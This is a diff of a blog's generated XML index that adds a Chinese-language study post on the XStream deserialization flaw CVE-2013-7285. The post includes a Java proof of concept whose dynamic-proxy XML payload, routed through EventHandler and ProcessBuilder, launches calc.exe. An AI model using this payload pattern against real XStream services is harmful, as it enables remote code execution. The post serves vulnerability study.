@@ -4,7 +4,32 @@
   
   
   <entry>
-    <title>Xstream（入门）</title>
+    <title>XStream（CVE-2013-7285）</title>
+    <link href="/2022/03/10/XStream%EF%BC%88CVE-2013-7285%EF%BC%89/"/>
+    <url>/2022/03/10/XStream%EF%BC%88CVE-2013-7285%EF%BC%89/</url>
+    
+    <content type="html"><![CDATA[<h1 id="XStream（CVE-2013-7285）"><a href="#XStream（CVE-2013-7285）" class="headerlink" title="XStream（CVE-2013-7285）"></a>XStream（CVE-2013-7285）</h1><p>上一篇复习到类似cc链的一个类。<strong>EventHandle</strong>，并且实现了弹出计算器。还了解了其如何反序列化。<br>这里要补充一个新知识点。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203101641308.png" alt="QQ截图20220310164057"></p><p><strong>dynamic-proxy标签在XStream反序列化之后会得到一个动态代理类对象，当访问了该对象的com.foo.Blah或com.foo.Woo这两个接口类中声明的方法时（即interface标签内指定的接口类），就会调用handler标签中的类方法com.foo.MyHandler。</strong></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.io.HierarchicalStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XstreamDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;dynamic-proxy&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;    &lt;interface&gt;com.thoughtworks.xstream.io.HierarchicalStreamReader&lt;/interface&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;    &lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;        &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;            &lt;command&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;        \t\t\t\t&lt;string&gt;calc.exe&lt;/string&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;            &lt;/command&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;        &lt;/target&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;        &lt;action&gt;start&lt;/action&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;    &lt;/handler&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;&lt;/dynamic-proxy&gt;&quot;</span>;<br>      <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>      <span class="hljs-type">HierarchicalStreamReader</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> (HierarchicalStreamReader)xStream.fromXML(s);<br>      obj.hasMoreChildren();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的<code>command</code>是<code>ProcessBuilder</code>接收的参数。</p><p>target同理。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203101717586.png" alt="QQ截图20220310171656"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>XStream</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>java</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>XStream（入门）</title>
     <link href="/2022/03/09/Xstream%EF%BC%88%E5%85%A5%E9%97%A8%EF%BC%89/"/>
     <url>/2022/03/09/Xstream%EF%BC%88%E5%85%A5%E9%97%A8%EF%BC%89/</url>
     
@@ -13,7 +38,7 @@
     
     <categories>
       
-      <category>Xstream</category>
+      <category>XStream</category>
       
     </categories>
     
@@ -595,7 +620,7 @@
     
     <tags>
       
-      <tag>Java</tag>
+      <tag>java</tag>
       
     </tags>
     
